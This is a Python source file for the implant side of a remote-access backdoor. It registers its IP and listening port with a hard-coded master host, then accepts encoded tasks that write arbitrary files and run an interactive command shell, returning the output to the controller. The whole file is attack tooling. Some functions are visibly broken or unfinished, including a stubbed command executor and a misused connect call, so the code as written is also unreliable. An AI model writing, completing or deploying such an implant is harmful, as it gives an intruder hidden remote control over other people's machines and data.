# 小可怜
import json
import shlex
import socket
import subprocess
import sys
import threading
import base64
import struct
Master_ip = "127.0.0.1"
Master_port = 9998
Passport = 1234
def get_host_ip():
    """
    查询本机ip地址
    :return:
    """
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('8.8.8.8',80))
        ip=s.getsockname()[0]
    finally:
        s.close()
 
    return ip

def tellMasterAddress(master_ip,master_port,myport):
    """告诉控制端自己的地址和开启的端口

    Args:
        master_ip (_type_): _description_
        master_prot (_type_): _description_
    """
    slave_code = "1"
    host_ip = get_host_ip()
    
    
    address_data =[slave_code,host_ip,myport]
    try:
        temp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        temp.connect((master_ip,master_port))
        print("[ ✓ ] Connected")
        send_data = str(address_data).encode()
        temp.send(send_data)
        print("[ ✓ ] Send address success")
        temp.close()
        
    except Exception as e:
        print ("[ ! ] Connection Errorr")
        print(e)
    finally:
        print("[ * ] Close Connection")
 

def connect_master():
    """连接目标机器，且进行初始化操作,获得socket

    """
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        server.connect(Master_ip,Master_port)
        #对密码
        server.send(Passport)
        
    except Exception as e:
        print("[ * ] Exception ! Exiting.")
        print(e)

def listen_master(ip = "0.0.0.0",port = 12345):
    """开启监听模式

    Args:
        ip (str, optional): 控制端ip. Defaults to "0.0.0.0".
        port (int, optional): 对应端口. Defaults to 12345.
    """
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((ip,port))
    
    try:
        print("[ * ] Waiting to connect master....")
        tellMasterAddress(Master_ip,Master_port,port)
    except Exception as e:
        #未来写 连不上master机器的情况
        print(e)
        sys.exit(0)
    
    server.listen(5)
    print(f'[ * ] Listening on {ip}:{port}')
    
    while True:
        master_socket,address = server.accept()
        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
        client_thread = threading.Thread(target=handler,args=(master_socket,))
        client_thread.start()


def packet_length_recv(thissocket):
    """_summary_接收报文头获得数据长度

    Args:
        socket (socket): socket

    Returns:
        int: data_length
    """
    data_header = thissocket.recv(4)
    data_length = struct.unpack('i',data_header)[0]
    return data_length

def add_packet_length(msg):
    """add packet header

    Args:
        msg (bytes): _description_

    Returns:
        bytes: _description_
    """
    
    data_length = len(msg)
    packet_header = struct.pack('i',data_length)
    return_data = packet_header + msg
    
    return return_data




def handler(master_socket):
    """服务端处理

    Args:
        master_socket (_type_): socket
    """
    recv_data = b""
    recv_size = 0
    
    #接收报文头
    data_length = packet_length_recv(master_socket)
    
    # 持续接收数据
    while (recv_size < data_length):
        buffer = master_socket.recv(1024)
        recv_size += len(buffer)
        recv_data += buffer

    recv_data = decode(recv_data).decode()
    recv_data = recv_data.replace('\'','\"')
    data = json.loads(recv_data)
        
    master_code = data[0]
    
    output = Master_choose[master_code](master_socket,data[1:])
    if output:
        send_msg = f"[ * ]Complete master task. Type {master_code} From ip {get_host_ip()}".encode()
        send_msg = add_packet_length(send_msg)
        master_socket.send(send_msg)
    else:
        send_msg = f"[ !!! ]Failed task!!. Type {master_code} From ip {get_host_ip()}".encode()
        send_msg = add_packet_length(send_msg)
        master_socket.send(send_msg)
    
    

def upload(master_socket,msg):
    """上传文件
    Args:
        msg (list): 目标路径和文件数据组成的列表
    """
    dst_path = msg[0][0]
    file_data  = msg[0][1]
    
    if(len(dst_path)):
            try:
                with open(dst_path,'w') as f:
                    f.write(file_data)
                    f.close()
                #self.socket.send(file_buffer)
                return True
                    
            except Exception as e:
                print(e)
def execute_command(master_socket,msg):
    
    
    command = 1
    
    
    run_command(command)
    pass


def run_command(command):
    """在服务器运行命令

    Args:
        command (str): 命令字符串

    Returns:
        b'str: 命令结果
    """
    command = command.rstrip() #删除尾部空格
    #运行命令
    if not command:
        return
    try:
        output = subprocess.check_output(shlex.split(command),stderr=subprocess.STDOUT)
    except Exception as e:
        print(type(e))
        
        output = f"[ !!! ]failed to execute {command}.\r\n"
        output = output.encode()
 
    #返回命令结果
    return output

def open_shell(master_socket,msg):
    """反弹shell交互

    Args:
        msg (str): _description_
    """
    
    while True:
        cmd_buffer = b""
        recv_size = 0
        cmd_length = packet_length_recv(master_socket)
        
        # 接收数据
        while (recv_size < cmd_length):
            temp_data = master_socket.recv(1024)
            recv_size += len(temp_data)
            cmd_buffer += temp_data
            
        
        cmd_buffer = decode(cmd_buffer).decode()
        if(cmd_buffer == "exit"):
            print(f"[ * ] Exit")
            break
        response = run_command(cmd_buffer)
        response = add_packet_length(response)
        master_socket.send(response)
    return True
    

def decode(msg):
    output = None
    data = msg
    
    output = base64.b64decode(data)
    return output

Master_choose = {
    'upload':upload,
    'execute':execute_command,
    'shell':open_shell
}

if __name__ == "__main__":
    listen_master(port=12345)